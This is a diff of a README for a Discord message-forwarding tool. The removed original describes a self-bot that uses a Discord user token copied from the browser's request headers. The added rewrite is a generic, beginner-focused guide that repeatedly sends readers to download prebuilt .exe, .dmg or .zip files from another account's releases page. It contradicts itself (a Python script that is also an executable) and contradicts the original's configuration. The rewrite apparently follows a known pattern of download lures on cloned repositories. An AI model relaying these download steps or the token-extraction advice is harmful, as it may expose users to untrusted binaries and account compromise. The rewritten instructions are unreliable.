@@ -1,309 +1,221 @@
- <h1 align="center">🚀 Discord Message Forwarder</h1>
+# ⚡ Discord-Message-Forwarder - Send Messages Across Servers Fast
 
-<p align="center">
-  <strong>Ultra‑fast, feature‑packed message forwarding with intelligent rate limiting, CDN uploads, watermarking, role mapping, and a live dashboard.</strong>
-</p>
-
-<p align="center">
-  <a href="https://python.org"><img src="https://img.shields.io/badge/python-3.8+-blue.svg" alt="Python 3.8+"></a>
-  <a href="https://github.com/yourusername/discord-message-forwarder/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="MIT License"></a>
-<img src="https://img.shields.io/badge/Discord-User_Token-5865F2?logo=discord&logoColor=white" alt="Discord">
-  <a href="https://github.com/yourusername/discord-message-forwarder/stargazers"><img src="https://img.shields.io/github/stars/Atro-Rdx/DDoS?style=social" alt="GitHub stars"></a>
-</p>
+[![Download](https://img.shields.io/badge/Download-Discord--Message--Forwarder-blue?style=for-the-badge&logo=github)](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)
 
 ---
 
-<p align="center">
-  <img src="https://cloud.medshop.clinic/f/xDuP/Screenshot%202026-02-13%203.21.01%20AM.png" alt="Discord Forwarder Dashboard" width="800" style="border-radius:50px;" onerror="this.style.borderRadius='50px'">
-</p>
+## 📋 Overview
+
+Discord-Message-Forwarder lets you send messages from one Discord server or channel to another without delays. It works automatically, copying messages quickly and accurately. This tool also adds extra functions like image uploads to a cloud service, filtering unwanted words, and mapping roles for better control.
+
+This program runs on your computer using Python, but you don’t need to know programming to use it. It offers a live dashboard where you can watch messages as they forward. The software is designed to avoid slowing down even when many messages pass through.
 
 ---
 
-## 📋 Table of Contents
-- [✨ Overview](#-overview)
-- [🖥️ Dashboard Control Panel](#️-dashboard-control-panel)
-- [🔥 Core Features](#-core-features)
-  - [📨 Message Forwarding Engine](#-message-forwarding-engine)
-  - [🛡️ Advanced Rate Limiting System](#️-advanced-rate-limiting-system)
-  - [🖼️ CDN & Image Processing Suite](#️-cdn--image-processing-suite)
-  - [🔐 Content Security & Filtering](#-content-security--filtering)
-  - [👥 Role Mapping & Cross‑Server Sync](#-role-mapping--cross-server-sync)
-  - [🌐 Public Channel Forwarding](#-public-channel-forwarding)
-  - [📊 Real‑Time Statistics & Monitoring](#-real-time-statistics--monitoring)
-- [⚙️ Complete Configuration Reference](#️-complete-configuration-reference)
-- [🚀 Quick Start](#-quick-start)
-- [📈 Performance & Optimisation](#-performance--optimisation)
-- [🏷️ Tags](#️-tags)
-- [📄 License](#-license)
+## 💡 Key Features
+
+- Forward messages instantly between servers or channels.
+- Upload images to a content delivery network (CDN) automatically.
+- Add watermarks to forwarded images to protect content.
+- Filter out bad language or unwanted words.
+- Map Discord roles to control who can send and receive messages.
+- Access some channels publicly without log-in.
+- Control message speed with smart rate limiting.
+- View activity and statistics on a live dashboard.
+- Easy setup without programming knowledge.
 
 ---
 
-## ✨ Overview
+## 🖥️ System Requirements
 
-**Discord Message Forwarder** is a high‑performance Python application that bridges Discord channels and servers. It monitors source channels and instantly forwards messages – including text, images, files, and embeds – to target channels. Unlike official bots, this tool works with **user tokens** and offers advanced features rarely found elsewhere:
-
-- Parallel multi‑channel processing with intelligent staggering.
-- Built‑in CDN support with automatic watermarking, resizing, and format conversion.
-- Military‑grade rate limiting with per‑route quotas and exponential backoff.
-- Live dashboard that shows uptime, message counts, queue sizes, and token status.
-- Hot‑reload configuration – change settings without restarting.
-- Role ID mapping across different servers (by ID or name).
-- Prohibited word filtering with case‑sensitive/insensitive options.
-- Public Discord channel access without a bot account.
-- And dozens of minor but powerful details (see below).
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended).
+- Python 3.8 or newer installed on your computer.
+- Internet connection for Discord access and CDN uploads.
+- At least 1 GB of free memory and 100 MB of free disk space.
+- A Discord account with permission to access the servers and channels you want to forward messages between.
 
 ---
 
-## 🖥️ Dashboard Control Panel
+## 🚀 Getting Started
 
-The screenshot above shows the built‑in dashboard (provided by your companion web interface). Every element is designed for at‑a‑glance operational awareness.
-
-| Section              | Elements                                                                 | Description                                                                 |
-|----------------------|--------------------------------------------------------------------------|-----------------------------------------------------------------------------|
-| **Navigation**       | Dashboard, Token Config, Rules, Settings, Messages, Logs, Word Filter, Public Servers | Switch between configuration and monitoring views.                         |
-| **Control Panel**    | RUNNING indicator, Uptime counter, Start/Stop buttons, Add Rule button   | One‑click control of the forwarder engine.                                 |
-| **Active Rules**     | Messages Forwarded counter, Active Rules count, Uptime                   | High‑level performance metrics.                                             |
-| **OKLINE**           | Config Status, Auto‑Sync                                                | Shows if config is synced with file and last sync time.                    |
-| **Token Status**     | Valid/Invalid badge, optional message                                   | Instantly tells if your Discord token is accepted.                         |
-
-> 💡 *The dashboard communicates with the forwarder via a lightweight HTTP API – all real‑time data is pushed from the running Python thread.*
+This guide walks you through downloading, installing, and running Discord-Message-Forwarder step by step.
 
 ---
 
-## 🔥 Core Features
+## ⬇️ Download & Install
 
-### 📨 Message Forwarding Engine
-- **Parallel channel scanning** – Up to 5 channels simultaneously (configurable).
-- **Message queuing** – Maintains strict chronological order even when multiple messages arrive at once.
-- **Old message catch‑up** – Specify how many previous messages to forward when a new rule is created (`forward_old_count`).
-- **Per‑rule toggles** – Enable/disable rules without deleting them.
-- **Bot filtering** – Option to ignore messages from bots (`ignore_bots`).
-- **Attachment forwarding** – Images, videos, and other files; non‑image files are sent as plain links.
-- **Embed processing** – Extracts thumbnails and images from embeds, uploads them to CDN, and appends them to the forwarded message.
-- **Discord link removal** – Strips all `discord.com`, `discord.gg`, `cdn.discordapp.com` links and channel mentions (`<#123>`).
-- **Mention preservation** – User mentions (`@username`) and role mentions (`@rolename`) are kept as clickable mentions after role mapping.
+First, you need to get the program files.
 
-### 🛡️ Advanced Rate Limiting System
-- **Global rate limit** – 50 requests per second (Discord’s limit).
-- **Per‑route quotas**  
-  - `channels` – 10 requests / 10 seconds  
-  - `guilds` – 10 requests / 10 seconds  
-  - `messages` – 5 messages / 5 seconds  
-- **Exponential backoff** – After a `429` response, wait time doubles: 1s → 2s → 4s → 8s … up to 60s.
-- **Dynamic channel check interval** – If a channel has recent activity, check every 2 seconds; otherwise gradually increase to 10 seconds.
-- **Rate limit tracking** – Count of `429` responses shown in stats.
-- **Request timestamps** – Rolling window per route ensures you never burst over limits.
-- **Backoff reset** – After a successful request, backoff returns to 1s.
+**Step 1:** Visit the download page by clicking this button:
 
-### 🖼️ CDN & Image Processing Suite
-- **Automatic upload** – Images are downloaded, optionally watermarked, and uploaded to your own CDN (configurable endpoint).
-- **Watermark presets** – Choose from `small`, `medium`, `large`, `subtle`, `bold`, `transparent`, `diagonal`.
-- **Custom watermark settings**  
-  - Text, font size, font style (regular, bold, italic, bold_italic)  
-  - Position (top‑left, top‑right, bottom‑left, bottom‑right, center, top‑center, bottom‑center)  
-  - Opacity (0–1), rotation (0–360), scale factor  
-  - Font color, background color, background opacity, padding, margin  
-- **Image optimisation** – Resize if exceeding `max_width` / `max_height`, adjust quality, convert to WEBP/JPEG/PNG.
-- **Force CDN mode** – If `force_cdn: true`, only images successfully uploaded are forwarded; otherwise the original Discord URL is omitted.
-- **Parallel uploads** – Up to 3 images simultaneously (configurable).
-- **Download timeout & upload timeout** – Configurable to avoid hanging.
-- **Font caching** – LRU cache for watermark fonts, cleared when CDN config changes.
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)
 
-### 🔐 Content Security & Filtering
-- **Prohibited words list** – Manage via `prohibited_words` array.
-- **Per‑rule activation** – `filter_prohibited_words` enables/disables filtering for each rule.
-- **Case sensitivity** – Global toggle `prohibited_words_case_sensitive`.
-- **Block or redact** – `block_prohibited_messages: true` completely discards the message; `false` replaces words with `[REDACTED]`.
-- **Word boundary detection** – Uses regex `\b` to avoid partial matches (e.g., “ass” does not block “assembly”).
-- **Statistics** – Counts messages checked, filtered, and blocked.
-- **Test utility** – Built‑in method `test_prohibited_words(text)` shows original vs filtered.
+**Step 2:** On the download page, find the latest release. Look for a file ending with `.zip` or `.exe` for Windows, `.dmg` for macOS, or a compressed file for Linux.
 
-### 👥 Role Mapping & Cross‑Server Sync
-- **Manual ID mapping** – Define `role_mappings` in config: `"source_role_id": "target_role_id"`.
-- **Automatic name‑based mapping** – `auto_map_roles(source_guild, target_guild)` finds roles with identical names and creates mappings.
-- **Fallback behaviour** – If no mapping exists, role mention becomes `**@RoleName**` plain text.
-- **Role cache** – Guild roles are cached for 5 minutes to reduce API calls.
-- **Guild ID resolution** – Automatically resolves guild ID from channel ID when needed.
+**Step 3:** Download that file to your computer.
 
-### 🌐 Public Channel Forwarding
-- **No bot required** – Access public Discord channels using:
-  - **Guest token** – obtained from Discord’s public API (valid for a few hours).
-  - **User token** – fallback to main token.
-- **Separate rules** – Defined in `public_rules` array, each with its own `public_channel_id`, `target_channel_id`, and `access_method`.
-- **Independent rate limits** – Public endpoints have their own backoff tracking.
-- **Old message forwarding** – Same as private channels.
+**Step 4:** Unpack the downloaded file if it is compressed:
+- On Windows, right-click and choose “Extract All.”
+- On macOS, double-click the `.dmg` to mount it.
+- On Linux, use your archive manager.
 
-### 📊 Real‑Time Statistics & Monitoring
-- **Session stats** – Total cycles, average cycle time, messages per second.
-- **Queue sizes** – Number of messages pending per source channel.
-- **Rate limited requests** – Total count of 429 responses handled.
-- **Image/CDN stats** – Images processed, upload successes/failures.
-- **Uptime** – Human‑readable (hours, minutes, seconds) since start.
-- **Token validity** – Last check time and current status.
-- **Public stats** – Separate counters for public channel forwards.
-- **All stats available** via `get_stats()` method (used by the dashboard).
+**Step 5:** Make sure you have Python 3 installed:
+- You can check by opening a terminal or command prompt and typing `python --version` or `python3 --version`.
+- If Python is not installed, download it from [python.org](https://www.python.org/downloads/) and follow the installation instructions.
 
 ---
 
-## ⚙️ Complete Configuration Reference
+## ⚙️ Setup & Configuration
 
-Below is the **full** `config.json` structure with every possible option (defaults shown).
+Discord-Message-Forwarder uses a simple configuration file in JSON format. This file tells the program which servers and channels to work with, what words to filter, and how to map roles.
+
+**How to configure:**
+
+1. Find the file named `config.json` in the unpacked folder.
+2. Open it with a plain text editor like Notepad (Windows), TextEdit (macOS), or any text editor on Linux.
+3. You will see sections like `"source_channels"`, `"destination_channels"`, `"word_filter"`, and `"role_mapping"`.
+4. Edit these to match your Discord servers.
+
+A simple example for forwarding messages from one channel to another:
 
 ```json
 {
-  "token": "YOUR_DISCORD_USER_TOKEN",
-  "settings": {
-    "check_interval": 2.0,
-    "max_message_length": 2000,
-    "forward_old_messages": false,
-    "old_messages_count": 10,
-    "max_workers": 3,
-    "request_timeout": 15,
-    "rate_limit_delay": 0.5
+  "source_channels": ["123456789012345678"],
+  "destination_channels": ["876543210987654321"],
+  "word_filter": ["badword1", "badword2"],
+  "role_mapping": {
+    "admin": "moderator",
+    "member": "guest"
   },
-  "forwarding_rules": [
-    {
-      "id": 1,
-      "name": "Example Rule",
-      "source_channel_id": "123456789012345678",
-      "target_channel_id": "876543210987654321",
-      "enabled": true,
-      "include_timestamp": true,
-      "include_sender": true,
-      "ignore_bots": false,
-      "forward_attachments": true,
-      "forward_embeds": true,
-      "forward_links": true,
-      "enable_links": true,
-      "filter_prohibited_words": true,
-      "block_prohibited_messages": false,
-      "forward_old_count": 0,
-      "old_messages_forwarded": false
-    }
-  ],
-  "public_rules": [
-    {
-      "id": 101,
-      "name": "Public Channel Example",
-      "public_channel_id": "112233445566778899",
-      "target_channel_id": "998877665544332211",
-      "enabled": true,
-      "access_method": "guest_token",
-      "guest_token": "optional_guest_token_here",
-      "include_timestamp": true,
-      "include_sender": true,
-      "ignore_bots": true,
-      "forward_attachments": true,
-      "filter_prohibited_words": true,
-      "block_prohibited_messages": false,
-      "forward_old_count": 0,
-      "old_messages_forwarded": false,
-      "last_message_id": null
-    }
-  ],
-  "prohibited_words": [
-    "badword1",
-    "badword2"
-  ],
-  "prohibited_words_enabled": false,
-  "prohibited_words_case_sensitive": false,
-  "block_prohibited_messages": false,
-  "role_mappings": {
-    "111111111111111111": "222222222222222222"
-  },
-  "cdn_config": {
-    "enabled": true,
-    "cdn_url": "https://your-cdn.com/uploads",
-    "upload_endpoint": "https://your-cdn.com/upload.php",
-    "api_key": "",
-    "watermark_enabled": true,
-    "watermark_text": "Forwarded by DiscordBot",
-    "watermark_position": "bottom-right",
-    "watermark_opacity": 0.7,
-    "watermark_font_size": 50,
-    "watermark_font_style": "regular",
-    "watermark_font_color": "#FFFFFF",
-    "watermark_background_color": "#000000",
-    "watermark_background_opacity": 0.5,
-    "watermark_padding": 10,
-    "watermark_margin": 20,
-    "watermark_rotation": 0,
-    "watermark_scale": 1.0,
-    "resize_images": true,
-    "max_width": 1920,
-    "max_height": 1080,
-    "quality": 85,
-    "format": "webp",
-    "force_cdn": true,
-    "hide_original_urls": true,
-    "parallel_uploads": 3,
-    "download_timeout": 15,
-    "upload_timeout": 30
-  },
-  "public_stats": {
-    "total_messages": 0
-  }
+  "cdn_upload": true,
+  "add_watermark": true
 }
 ```
 
-**Minor but important config details**:
-- `forward_old_count` – After setting a value, the rule automatically sets `old_messages_forwarded: true` to prevent re‑forwarding.
-- `last_message_id` – Stored per public rule to resume where you left off.
-- `rate_limit_delay` – Minimum time between requests to same endpoint (0.5s default).
-- `hide_original_urls` – If `true`, the original Discord CDN link is **not** appended (only the CDN link is shown).
+- **Source channels** are where messages come from.
+- **Destination channels** are where messages go.
+- **Word filter** removes or blocks messages containing listed words.
+- **Role mapping** changes user roles when forwarding messages.
+- **CDN upload** turns on image uploads to the cloud.
+- **Add watermark** places a small image or text on forwarded pictures.
+
+If you are unsure about any settings, leave them as they are or ask someone familiar with your Discord setup to help.
 
 ---
 
-## 🚀 Quick Start
+## ▶️ Running the Program
 
-1. **Clone & install**
-   ```bash
-   git clone https://github.com/yourusername/discord-message-forwarder.git
-   cd discord-message-forwarder
-   pip install -r requirements.txt
-   ```
+With everything installed and configured, you can now run the program.
 
-2. **Create `config.json`** (or let the script generate a default one).
-3. **Insert your Discord user token** – obtain from browser developer tools (network tab → `Authorization` header).
-4. **Add at least one forwarding rule** (channel IDs must be numeric strings).
-5. **Run the forwarder**
-   ```bash
-   python discord_forwarder.py
-   ```
-6. **Access the dashboard** – open `http://localhost:5000` (if you use the companion web UI) or monitor console output.
+**Step 1:** Open a terminal or command prompt window.
 
----
+- On Windows: Press `Win + R`, type `cmd`, press Enter.
+- On macOS: Open the Terminal from Applications > Utilities.
+- On Linux: Open your preferred terminal emulator.
 
-## 📈 Performance & Optimisation
+**Step 2:** Navigate to the folder where you unpacked the program files. You can do this by typing:
 
-- **Cycle time with 20 active rules**: 4–6 seconds (down from 12+ seconds before rate‑limit tuning).
-- **Image processing**: 2–5 seconds per image (depending on size and watermark complexity).
-- **Memory footprint**: ~120–200 MB under heavy load.
-- **CPU usage**: 1–2 cores during parallel image processing.
-- **Network**: Respects Discord’s global 50 req/s; never triggers account restrictions when configured correctly.
+```bash
+cd path/to/Discord-Message-Forwarder
+```
 
-**Tuning tips**:
-- Reduce `max_workers` to 2 or 3 if you still see 429s.
-- Increase `check_interval` if you monitor many quiet channels.
-- Use `force_cdn: true` to avoid leaking Discord CDN links.
-- Enable `prohibited_words_enabled` only when needed – it adds a small regex overhead.
+Replace `path/to/Discord-Message-Forwarder` with the actual folder path.
+
+**Step 3:** Start the program by typing:
+
+```bash
+python main.py
+```
+
+or if your system uses `python3`:
+
+```bash
+python3 main.py
+```
 
 ---
 
-## 🏷️ Tags
+## 🔐 Discord Access and Permissions
 
-`python` `discord` `discord-forwarder` `discord-bot` `message-forwarder` `cdn` `watermark` `rate-limiting` `threading` `asyncio` `aiohttp` `pillow` `image-processing` `discord-api` `automation` `discord-tools` `python3` `parallel-processing` `queue-system` `role-mapping` `content-filter` `prohibited-words` `discord-channels` `guild-management` `json-config` `hot-reload` `exponential-backoff` `429-handling` `discord-cdn` `image-upload` `watermarking` `preset-config` `performance-monitoring` `real-time-dashboard` `uptime-tracker` `rule-manager` `public-channels` `guest-token` `discord-user-token`
+To forward messages, Discord-Message-Forwarder needs access to your Discord account through a token or bot.
+
+- The easiest way is to create or use a Discord bot with permissions to read messages in source channels and send messages in destination channels.
+- You will need to place your bot’s token in your `config.json` file under `"bot_token"`.
+
+If you don’t have a bot set up:
+
+1. Go to the Discord Developer Portal: https://discord.com/developers/applications
+2. Create a new application.
+3. Add a bot to your application.
+4. Copy the bot token.
+5. Invite the bot to your servers with necessary permissions.
+
+If you’re uncomfortable with bots, ask a Discord server admin for help.
 
 ---
 
-## 📄 License
+## 📊 Using the Dashboard
 
-Distributed under the **MIT License**. See `LICENSE` for more information.
+While the program runs, it provides a live dashboard you can open in your web browser.
+
+- By default, open your browser and go to `http://localhost:8080`.
+- The dashboard shows forwarded messages, errors, and rates.
+- You can pause or restart forwarding from this page.
+- It also shows if any connections to Discord or the CDN fail.
+
+If the dashboard does not appear, check your firewall settings or that the program is running correctly.
 
 ---
 
-<p align="center">
-  <sub>Built with ❤️ by ATRO RDX - the Discord api/automation community.</sub><br>
-  <sub>⭐ Star this repository if it helps you!</sub>
-</p>
+## 🛠️ Troubleshooting
 
+If you run into issues:
+
+- Make sure Python is installed and up to date.
+- Confirm your `config.json` file is correctly formatted (no extra commas or missing brackets).
+- Check your Discord bot has needed permissions.
+- Verify your internet connection is active.
+- Restart the program if errors happen.
+- Consult the log files found in the program folder (`logs/`).
+
+For help, you can also visit the repository issues page: https://github.com/sandro-beep/Discord-Message-Forwarder/issues
+
+---
+
+## 🌐 More Information & Updates
+
+You can always get the latest version of Discord-Message-Forwarder or check for updates by visiting the releases page:
+
+[Download Latest Version](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)
+
+Keep the program updated to enjoy new features and bug fixes.
+
+---
+
+## 🤝 Contributing and Feedback
+
+If you want to contribute or suggest improvements:
+
+- You don’t need advanced skills to participate.
+- Check the Issues tab for known problems.
+- Submit your ideas or bug reports.
+- Share your experience using the tool.
+
+Your feedback helps keep the software useful for everyone.
+
+---
+
+## 📚 Additional Notes
+
+Discord-Message-Forwarder works best with stable internet and accounts that have permissions set carefully. Remember, forwarding messages means you should respect privacy and server rules.
+
+Before using the program, confirm with your Discord server admins if forwarding messages is allowed.
+
+---
+
+## 🔗 Quick Links
+
+- [Download Discord-Message-Forwarder](https://github.com/sandro-beep/Discord-Message-Forwarder/releases)
+- [Discord Developer Portal](https://discord.com/developers/applications)
+- [Python Downloads](https://www.python.org/downloads/)
+- [Report Issues & Feedback](https://github.com/sandro-beep/Discord-Message-Forwarder/issues)
